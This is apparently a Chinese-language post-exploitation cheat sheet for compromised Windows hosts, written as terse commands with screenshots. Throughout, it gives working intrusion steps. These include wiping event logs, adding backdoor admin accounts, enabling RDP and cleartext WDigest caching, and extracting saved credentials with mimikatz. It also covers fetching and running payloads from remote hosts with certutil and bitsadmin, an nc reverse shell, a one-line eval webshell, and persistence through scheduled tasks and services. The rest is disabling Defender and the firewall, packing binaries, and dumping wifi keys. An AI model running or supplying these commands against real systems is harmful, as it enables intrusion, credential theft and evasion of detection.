获取shell后乱码  输入:  chcp 65001   
<a name="MBCYm"></a>
### 查看更改后的RDP端口(3389变更后的端口)
如何查看被改后3389的端口<br />执行命令 tasklist /svc | find "Ter"，本例中查看到 TermService 的 PID 是 1592。<br />执行命令 netstat -ano | find "1592"，查看 TermService 使用的端口，如示例中的 3389。<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611400893159-1fd1ed3e-2d52-4f12-b962-8b8970006029.png#averageHue=%23090504&height=85&id=LREiZ&originHeight=162&originWidth=788&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=415)
<a name="F2KSL"></a>
## WMIC模块
wmic rdtoggle list，查看是否开启远程桌面<br />0代表关闭，1代表开启<br /> <br />1.查询系统中所安装的补丁<br />wmic qfe get Caption,Description,HotFixID,InstalledOn<br /> <br />查看安装过什么服务，python、java还是啥的<br />wmic PRODUCT get name,version<br /> <br />wmic FSDIR where "drive='d:' and filename='php'" get name

查找d盘下命名为php的文件<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611379469628-d0983ff2-5507-48cb-8095-33fed062267b.png#averageHue=%231a1713&height=98&id=m67Iv&originHeight=196&originWidth=810&originalType=binary&ratio=1&rotation=0&showTitle=false&size=146357&status=done&style=none&title=&width=405)<br /> <br />wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe<br />查看安装了什么杀软<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611379488905-e2745915-c947-4b2f-af83-eb9ef7f8d263.png#averageHue=%2312110f&height=42&id=lvWYq&originHeight=83&originWidth=1033&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54525&status=done&style=none&title=&width=516.5)

查看进程在哪个路径下<br />wmic process where name="notepad.exe" get name,executablepath,processid<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1629464822761-91179f0f-4447-49fd-9421-5e8b2663aa9f.png#averageHue=%23161311&height=237&id=GJZ98&originHeight=316&originWidth=878&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61111&status=done&style=none&title=&width=659)

<a name="Zw5VN"></a>
## windows清理日志
wevtutil.exe cl Application  #清除应用日志<br />wevtutil.exe cl security        #清除安全日志
<a name="RYJI4"></a>
## 信息收集
# 查看IP<br />ipconfig /all<br /># 查看arp表<br />arp -a<br /># 查看主机路由情况<br />route print<br /># 查看网络连接情况<br />netstat -ano<br /># 通过路由跟踪发现未知网段<br />tracert xxxxxxxx<br />#查看谁远程登陆过<br />query user
<a name="cqbWU"></a>
## windows命令行操作
在Windows命令行切换到管理员权限<br />1.打开cmd<br />2.输入runas /noprofile /user:Administrator cmd<br />3.输入密码<br /> <br />03版本的一些netsh命令使用<br />netsh interface portproxy show all #查看端口映射<br />netsh firewall show state 查看系统防火墙状态<br />netsh firewall set opmode disable 关闭防火墙<br />netsh firewall set opmode enable 开启防火墙<br />设置进出站规则<br />netsh firewall add portopening 协议 端口 名字<br />netsh firewall add portopening tcp 333 test添加规则<br />netsh firewall delete portopening tcp 333 删除规则<br />win03后的版本<br />netsh advfirewall show allprofiles 查看所有类型的防火墙状态<br />netsh advfirewall set allprofiles state off关闭防火墙<br />netsh advfirewall set allprofiles state on 开启防火墙<br />netsh advfirewall reset 重置防火墙规则（重置到刚装好系统时的状态）<br /> <br /> <br /> <br /> <br /> <br /> <br />添加用户账号密码<br />net user username passwd /add 添加一个3389登录用户<br />net localgroup administrators username passwd /add 把该用户添加到超级管理员组<br /> <br />激活guest：net user guest /active:yes<br />提权:net localgroup administrators guest /add(administrator后面加s)<br />net user guest    密码                            #更改guest用户密码
<a name="zhtAy"></a>
## 开启3389
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  （win7） #开启3389端口

wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1   （win7） #开启3389端口  **实战好用**

beacon> shell Wmic /namespace:\\root\cimv2\terminalservices path Win32_terminalservicesetting where (__CLASS !="") call setallowtsconnections 1  （win8） #开启3389端口  **实战好用**<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1619597591044-5c494302-419c-4bc1-bbf9-2fbff28749a7.png#averageHue=%23090302&height=270&id=zhTMW&originHeight=540&originWidth=1257&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56613&status=done&style=none&title=&width=628.5)

`REG ADD \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f     ``（win03）`<br />` `<br />REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f<br />` `<br />REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0x00000d3d /f      （win08）<br /> #win12 (使系统在内存缓存账号明文，这样当管理员重新登陆后就可以提取明文密码了。)<br />reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

**#win10**<br />netsh advfirewall set allprofiles state off<br />REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f<br /> <br />**#  Windows Server 2008 / Win7 / 2012**<br />reg add "HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER"  /v fSingleSessionPerUser   /t  REG_DWORD /d  0  /f<br /> <br />wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1<br /> 

wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !="") call setallowtsconnections 1<br /> <br /> <br />**#  Windows Server 2003 / xp**<br />wmic path win32_terminalservicesetting where (__CLASS !="")   call  setallowtsconnections 1<br /> <br />REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f<br />query user 查看当前登录用户
<a name="uDpEH"></a>
## 开启3389 （2
1.通用开3389(优化后)：<br /> wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1<br />2.For Win2003:<br />  REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f<br />3.For Win2008:<br />  REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f<br />4.For Every:<br />** win08，三条命令即可，win2012通用；win7前两条即可。权限需要administrator。**<br />  wmic /namespace:\root\cimv2      erminalservices path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1

  wmic /namespace:\root\cimv2      erminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1

  reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f<br /> <br /> 
<a name="xqXPc"></a>
## 下载 && 执行&&写入webshell
certutil<br />[https://zhuanlan.zhihu.com/p/385772690](https://zhuanlan.zhihu.com/p/385772690)
```python
通过certutil以base64编码方式写入webshell文件

场景：命令执行情况下，写入webshell的文本文件。

webshell内容中含有较多特殊字符，如果直接echo xxx > shell.jsp，其中的特殊字符会影响该命令的执行，而base64编码后的文本可以直接写入文本，无特殊字符影响。

文本内容：<%@page import="java.util.*,base64编码后为：PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLA==
写入文件：echo PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLA== > C:\tmp\shell.txt
解码成webshell文件：certutil -f -decode "C:\tmp\shell.txt" "C:\tmp\shell.jsp"
```
certutil -urlcache -split -f http://192.168.10.144:8081/test.exe<br />certutil.exe -urlcache -split -f http://ip/test/1.exe c:\1.exe 下载到c盘

下载完后记得删除缓存
```
certutil -urlcache * delete
```


certutil.exe -urlcache * 查看缓存![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1629874291443-923935b4-89e5-4ddb-9bc3-ec13a54022f9.png#averageHue=%230d0d0d&height=285&id=lKlf6&originHeight=285&originWidth=409&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11336&status=done&style=none&title=&width=409)

bitsadmin /transfer n <文件下载路径> <文件保存路径><br />bitsadmin /transfer n http://ip/test/1.exe c:\\1.exe

powershell Start-BitsTransfer -Source "http://xxx.xxx.xx.xxx:8800/111.txt" -Destination "C:\123123.txt" <br />(需要超级管理员权限）<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1629856468746-8df3634a-dd97-492f-b2c9-d2f59f7c59ba.png#averageHue=%23012657&height=77&id=Co9vk&originHeight=102&originWidth=1097&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13154&status=done&style=none&title=&width=823)

C:\Users\Administrator>certutil.exe -urlcache -split -f [http://xxx.xxx.xxx:8800](http://121.4.236.95:8800)<br />/tasklist1.exe c:\\tasklist1.exe && start c:\\tasklist1.exe<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1629858676821-0c2caefc-2acd-49ce-957f-89d2fbcbc69e.png#averageHue=%230d0d0d&height=127&id=ga3qV&originHeight=169&originWidth=824&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14141&status=done&style=none&title=&width=618)

-------------------------------------------------------------------------------------------------<br />net localgroup administrators 查看本地管理员组<br /> <br />本地端口转发:3389转发到13389<br />netsh interface portproxy add v4tov4 listenaddress=192.168.10.15 listenport=13389 connectaddress=192.168.10.15 connectport=3389<br /> <br />netstat -ano|findstr “3389” 查找端口<br />tasklist -ano|findstr “进程号”<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611379610595-5192553e-9dac-413a-a3a2-51bb0954a792.png#averageHue=%230f0f0f&height=123&id=FCmvp&originHeight=246&originWidth=1007&originalType=binary&ratio=1&rotation=0&showTitle=false&size=89372&status=done&style=none&title=&width=503.5)<br />2.1 按进程号关闭进程<br />taskkill /pid 2152<br />多个时格式为：<br />taskkill /pid 2152 /pid 1284

2.2 按进程名关闭进程<br />如要关闭notepad.exe,格式为：<br />taskkill /im notepad.exe<br />指定多个时格式为：<br />taskkill /im notepad.exe /im iexplorer.exe<br />如果是要关闭所有的,则使用通配符*,即：<br />taskkill /im *.exe<br />2.3 有提示的关闭进程<br />taskkill /t /im notepad.exe<br />taskkill /t /pid 2152<br />这个效果是提示后在使用者确定后关闭,有提示框。<br />2.4 强行终止进程<br />taskkill /f /im notepad.exe<br />taskkill /f /pid 2152
<a name="tP8qR"></a>
## 命令行开启3389
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f<br /> <br />Meterpreter> run post/windows/manage/enable_rdp 开启3389
<a name="5Io8P"></a>
## RDP凭证泄露(查看登录过的3389凭证)需要点击保存
#查看mstsc的连接纪录<br />cmdkey /list <br /> <br />#查找本地的Credentials：(这个很重要)<br />dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611379627572-e5570ade-5cea-45a7-babe-8b9e91c751d9.png#averageHue=%23131313&height=149&id=RJ9eh&originHeight=297&originWidth=1015&originalType=binary&ratio=1&rotation=0&showTitle=false&size=142718&status=done&style=none&title=&width=507.5)<br />Mimikatz#privilege::debug （最好用32位的，管理员权限运行）<br />mimikatz # dpapi::cred /in:C:\Users\ Administrator\AppData\Local\Microsoft\Credentials\0318F07ABF5F6F2757EADB7A2BC8646C<br />找到对应的guidMasterKey<br /> <br />guidMasterKey      : {145d894c-8371-44b2-86fc-4b0385884420}<br /> <br />mimikatz # sekurlsa::dpapi  通过guidMasterKey找到GUID，然后对照MsterKey<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611379693829-992dc0e1-643d-45da-939b-a7875b8bd735.png#averageHue=%230c0a08&height=61&id=hH7L7&originHeight=121&originWidth=1025&originalType=binary&ratio=1&rotation=0&showTitle=false&size=64655&status=done&style=none&title=&width=512.5)<br />mimikatz # dpapi::cred /in:C:\Users\ASUS\AppData\Local\Microsoft\Credentials\0318F07ABF5F6F2757EADB7A2BC8646C /masterkey:5cbfef4086912ab607992ca5f55c19a082c114d0d05a8ef9d493c4db5b3e1446fc8a3f9903f65667ec2c6428e8001c626a388dd81cecc44348896aa730d53b3c" <br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611379711442-c0c3ff1d-804c-4819-9dfd-9e1c02952062.png#averageHue=%23080604&height=296&id=FA6TR&originHeight=394&originWidth=541&originalType=binary&ratio=1&rotation=0&showTitle=false&size=115911&status=done&style=none&title=&width=406)
<a name="6n0Gg"></a>
### netpass 永远的神
有时候mimikatz无法抓取密码，但是netpass是永远的神。而且还能过火绒！<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615726865601-9e92426d-2d48-4a61-803f-8e8416b21b05.png#averageHue=%23f4f3f1&height=300&id=qS2tl&originHeight=600&originWidth=1244&originalType=binary&ratio=1&rotation=0&showTitle=false&size=249985&status=done&style=none&title=&width=622)
<a name="5cWDu"></a>
## netsh命令使用
03版本的一些netsh命令使用<br />netsh interface portproxy show all #查看端口映射<br />netsh firewall show state 查看系统防火墙状态<br />netsh firewall set opmode disable 关闭防火墙<br />netsh firewall set opmode enable 开启防火墙<br />设置进出站规则<br />netsh firewall add portopening 协议 端口 名字<br />netsh firewall add portopening tcp 333 test添加规则<br />netsh firewall delete portopening tcp 333 删除规则<br />**win03后的版本**<br />netsh advfirewall show allprofiles 查看所有类型的防火墙状态<br />netsh advfirewall set allprofiles state off 关闭防火墙<br />netsh advfirewall set allprofiles state on 开启防火墙<br />netsh advfirewall reset 重置防火墙规则（重置到刚装好系统时的状态）<br /> 
<a name="zz629"></a>
## 添加账号和查看
net user username password /add<br />net localgroup /add administrators username<br />net user (用户名) /delete<br />net user 用户名名字（查看权限）<br /> <br />net user admin 1qaz2wsx.* /add &&net localgroup /add administrators admin
<a name="FAO8r"></a>
## 进程、端口
netstat -ano | findstr pid （通过进程号pid来查看端口号）<br /> 
<a name="upuLD"></a>
## netsh端口转发
本地10.254.172.152ip 6380端口转发到80端口，所以对80连接相当于访问6380端口<br />netsh interface portproxy add v4tov4 listenport=80 connectaddress=10.254.172.152 connectport=6380

netsh interface portproxy add v4tov4 listenport=<监听端口> connectaddress=<被转发的ip> connectport=<被转发的端口>  
<a name="sFeAc"></a>
## 查找文件
dir c:\ /s /b | find "SecurityUtils" > SecurityUtils.txt    查找含有SecurityUtils的目录<br />dir /s /b | find "aspx"  搜索当前目录下以及子目录所有aspx文件<br />findstr /msi /c:"saveas" *.aspx*          /s代表当前目录， 搜索当前目录下所有aspx文件的saveas内容
<a name="fa7IJ"></a>
## 权限维持
<a name="Pug07"></a>
### schtasks定时计划任务

 比如想要创建一个名为”testschtask”的任务，该任务在每天的13:00时，执行脚本D:\test.py  <br />shell schtasks /create /tn testschtask /tr D:\test.py /sc DAILY /st 13:00:00

列出当前所有的计划任务<br />schtasks /Query /tn testschtask

要删除任务<br />schtasks /Delete /tn testschtask

例子：<br />执行每过3分钟执行bat里的内容:<br />SCHTASKS /Create /sc minute /mo 3 /tn "test" /tr "C:\inetpub\wwwroot\caiji\aaa.bat"<br />删除:<br />SCHTASKS /Delete /tn "test"

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1632654829759-e2566b93-8548-4225-b723-ded5cdfb5e12.png#averageHue=%230f0e0e&clientId=ua710643e-bfeb-4&from=paste&height=411&id=u0150b1b7&originHeight=548&originWidth=795&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51389&status=done&style=none&taskId=u54508ac1-6c3a-4f85-bdc1-d482a3e1b69&title=&width=596)

<a name="arUkr"></a>
### nc反弹shell
nc.exe -e cmd.exe ip port<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1646834838414-bc0eddb0-ea18-4f28-9f66-a807c1fea6c1.png#averageHue=%23767676&clientId=u10ed04fc-e647-4&from=paste&height=308&id=u8cf15dcf&originHeight=410&originWidth=1221&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53173&status=done&style=none&taskId=ubdf1ddfe-8614-40e3-aae5-1ba77b558b5&title=&width=916)
<a name="zJ1va"></a>
### sc.exe开机自启动

sc.exe create scname_1 binPath= c:\windows\temp\test.exe<br />sc.exe config scname_1 start= auto #设置为开机自启，可有可无<br />sc.exe start scname_1

<a name="lmD6R"></a>
## **attrib **隐藏
**attrib +s +h 需要隐藏的文件夹/文件名称**
<a name="OHDo3"></a>
## ping

ping -a ip<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1632919464227-b98f40c7-d1d1-4643-961d-8e99ee97df3f.png#averageHue=%23181311&clientId=u2c80d317-35ce-4&from=paste&height=121&id=u6568c4ec&originHeight=161&originWidth=690&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24915&status=done&style=none&taskId=ua1f85d9d-ee5b-4b2d-b9d3-ab0e22a3f5a&title=&width=518)

ping -n 1 -r 9 192.168.1.101<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1632919600932-04b1397c-1170-4f91-a794-e6d86fc652a0.png#averageHue=%234f4e4e&clientId=u2c80d317-35ce-4&from=paste&height=328&id=udd2d975e&originHeight=656&originWidth=842&originalType=binary&ratio=1&rotation=0&showTitle=false&size=220904&status=done&style=none&taskId=u60a17c0d-2568-42a8-bfdf-4a66af6cb2d&title=&width=421)


<a name="IRaWb"></a>
## 关于cmd.exe权限低，无法执行的问题
在webshell下，有时候System32、SysWOW64目录下的cmd.exe文件有时候会没权限执行。解决办法有两个，一个是上传cmd.exe文件，另一个就是找另外一个位置的cmd.exe

可以通过dir c:\ /s /b | find "cmd.exe"  找到路径：
```go
win10路径
C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~19041.1165.1.8\amd64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.19041.746_none_69061189792bce34\f

win7
c:\Windows\winsxs\wow64_microsoft-windows-commandprompt_31bf3856ad364e35_6.1.760
1.17514_none_f387767e655cd5ab\cmd.exe

win08路径
C:\Windows\winsxs\amd64_microsoft-windows-commandprompt_31bf3856ad364e35_6.1.7601.17514_none_e932cc2c30fc13b0\cmd.exe
C:\Windows\winsxs\wow64_microsoft-windows-commandprompt_31bf3856ad364e35_6.1.7601.17514_none_f387767e655cd5ab\cmd.exe

win12
C:\Windows\WinSxS\amd64_microsoft-windows-commandprompt_31bf3856ad364e35_6.3.9600.16384_none_7bcb26c7ee538fe3\cmd.exe
C:\Windows\WinSxS\wow64_microsoft-windows-commandprompt_31bf3856ad364e35_6.3.9600.16384_none_861fd11a22b451de\cmd.exe
```

将这个路径添加到环境变量<br />设置cmd.exe终端路径：
```go
setx -m PATH "%PATH%;c:\Windows\winsxs\wow64_microsoft-windows-commandprompt_31bf3856ad364e35_6.1.760
1.17514_none_f387767e655cd5ab"  
```

<a name="ExQmU"></a>
## 关于echo写入webshell的问题^
```go
echo ^<^%^@Page Language=^"^Jscript^"^%^>^<^%^eval(Request.Item^[^"aufeng^"^]^,^"unsafe^")^;^%^> >1.txt
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1636464841142-6a02ec93-9263-456b-899e-a5fb2e074951.png#averageHue=%23141312&clientId=ua184e538-1bfd-4&from=paste&id=ub10c4236&originHeight=151&originWidth=1210&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22292&status=done&style=none&taskId=u0e83e245-a756-4b16-9d37-077e3b1f4cc&title=)

<a name="zQEKT"></a>
## 利用自带的系统exe文件执行exe

forfiles /p c:\windows\system32 /m notepad.exe /c "c:\windows\temp\test.exe"<br />pcalua.exe -a c:\windows\temp\test.exe<br />conhost.exe "c:\windows\temp\test.exe"

<a name="LaANB"></a>
## 关闭windefender防火墙
sc stop WinDefend<br />sc config WinDefend start=disabled<br />sc query WinDefend

<a name="mAwtM"></a>
## 关闭windefender
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /d 1 /t REG_DWORD /f  

<a name="t4cTF"></a>
## 删除RDP连接的记录

删除这个文件<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1655451164444-ef42b485-1718-44da-a0cf-5848ee7fa127.png#averageHue=%23fcfcfb&clientId=u93d33571-94e8-4&from=paste&height=626&id=u0ea7ca45&originHeight=782&originWidth=2016&originalType=binary&ratio=1&rotation=0&showTitle=false&size=295856&status=done&style=none&taskId=ud9f72af9-5496-4eb2-9a13-f2f1f5c0500&title=&width=1612.8)<br />还有下面注册表<br />HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default
<a name="iO1p5"></a>
## UPX压缩
以下命令分别对1.exe进行压缩，压缩程度越来越高，压缩时间相应的也越来越长<br />upx.exe -o 2.exe 1.exe<br />upx.exe --best  -o 3.exe 1.exe<br />upx.exe --brute -o 4.exe 1.exe

<a name="A7rX6"></a>
## windows挂后台运行

创建个vbs脚本，ws.Run内容中插入需要运行的内容
```go
set ws=WScript.CreateObject("WScript.Shell") 
ws.Run "calc.exe",0
```
<a name="rWNZM"></a>
## wmic
<a name="Q1eiO"></a>
### 强行结束高权限进程

id 5576是system进程权限<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639239097772-b6db888f-4565-4036-92e0-01f18d0f5644.png#averageHue=%230b0b0b&clientId=u302d5083-afc3-4&from=paste&height=54&id=u4d8dd3f6&originHeight=65&originWidth=802&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2467&status=done&style=none&taskId=u2065e423-5088-47a0-8dea-b70ff66deec&title=&width=662)

taskkill /pid 是无法强行终止<br />利用wmic可以强行终止高权限<br />wmic process where processid=5576 call terminate<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639239016459-46100079-87bf-48f0-9add-e4f4a699ae61.png#averageHue=%230a0a0a&clientId=u302d5083-afc3-4&from=paste&height=291&id=ub1cdbfdb&originHeight=353&originWidth=726&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13634&status=done&style=none&taskId=u0173351b-14d4-4755-9957-0cd46571739&title=&width=599)

<a name="zgAQL"></a>
### 列举所有进程、路径、线程数
wmic process get name,executablepath,commandline,processid,parentprocessid,threadcount,workingsetsize/value  <br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639239640728-6e952f2d-202b-4551-93f6-a78306140266.png#averageHue=%230f0f0f&clientId=u302d5083-afc3-4&from=paste&height=390&id=u7eaae97f&originHeight=345&originWidth=514&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12168&status=done&style=none&taskId=u5ff80096-bf6d-4408-b05a-eef31942946&title=&width=581)
<a name="Ll8hw"></a>
### 获取可以执行的文件列表
wmic process where "NOT ExecutablePath Like '%windows%'" Get ExecutablePath<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639239877719-fa90ffd7-056c-4856-ad52-1ca397bf0ae5.png#averageHue=%23191919&clientId=u302d5083-afc3-4&from=paste&height=332&id=u5618d1df&originHeight=439&originWidth=810&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22537&status=done&style=none&taskId=u2ec887d8-9aef-43cb-8269-a08af8e0694&title=&width=613)

<a name="FqIVB"></a>
### 关闭3389端口命令
wmic  rdtoggle where AllowTSConnections="1" call SetAllowTSConnections "0"<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639240258783-5a575119-ff60-4cc0-b4b0-389cae2c3b32.png#averageHue=%23141010&clientId=u302d5083-afc3-4&from=paste&height=364&id=u610d5377&originHeight=471&originWidth=833&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16930&status=done&style=none&taskId=u62587abf-f16c-4265-bf4d-60f1df6f538&title=&width=643.5)

<a name="hZiKF"></a>
## 获取wifi密码
```java
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear 
```
<a name="tKMBe"></a>
## 获取powershell历史记录
```java
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
